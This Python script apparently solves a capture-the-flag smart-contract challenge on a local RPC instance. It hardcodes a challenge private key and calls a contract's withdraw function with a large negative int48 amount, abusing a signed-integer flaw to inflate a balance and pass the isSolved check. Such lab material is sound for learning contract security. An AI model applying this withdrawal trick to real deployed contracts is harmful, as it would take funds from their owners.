from web3 import Web3


### CONSTANTS ###
RPC_URL = "http://localhost:8080/65418a98-1a8a-4579-ab27-4faf3af86f16"
PRIVKEY = "22098522aa7cc6021d755e52982a7c28e1c9d17d6cc4c179e0671d4a885699cb"
SETUP_CONTRACT_ADDR = "0x1eA69616fCEF4e34B0A3fEaf64Cc0e667821A432"
WALLET_ADDR = "0xC242f809b2aaaf2df37b5B1fA76612D30f4392dE"


### INITIALIZATIONS ###
w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = w3.eth.account.from_key(PRIVKEY)
CONTRACT_ABI = [
	{
		"inputs": [
			{
				"internalType": "int48",
				"name": "amount",
				"type": "int48"
			}
		],
		"name": "deposit",
		"outputs": [],
		"stateMutability": "payable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "getBalance",
		"outputs": [
			{
				"internalType": "int48",
				"name": "",
				"type": "int48"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "isSolved",
		"outputs": [
			{
				"internalType": "bool",
				"name": "solved",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "int48",
				"name": "amount",
				"type": "int48"
			}
		],
		"name": "withdraw",
		"outputs": [
			{
				"internalType": "bool",
				"name": "successful",
				"type": "bool"
			}
		],
		"stateMutability": "payable",
		"type": "function"
	}
]
contract = w3.eth.contract(address=SETUP_CONTRACT_ADDR, abi=CONTRACT_ABI)


print(f"Balance: {contract.functions.getBalance().call()}")

### WITHDRAW ###
transaction = contract.functions.withdraw(-(2**47 - 1)).build_transaction({
    'from': WALLET_ADDR,
    'nonce': w3.eth.get_transaction_count(WALLET_ADDR),
    'chainId': w3.eth.chain_id,
})
signed_transaction = w3.eth.account.sign_transaction(transaction, PRIVKEY)
transaction_hash = w3.eth.send_raw_transaction(signed_transaction.raw_transaction)
transaction_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)

print(f"Transaction hash: {transaction_hash.hex()}")
print(f"Transaction status: {transaction_receipt.status}")
print(dict(transaction_receipt))


print(f"Balance: {contract.functions.getBalance().call()}")
print(f"Is solved: {contract.functions.isSolved().call()}")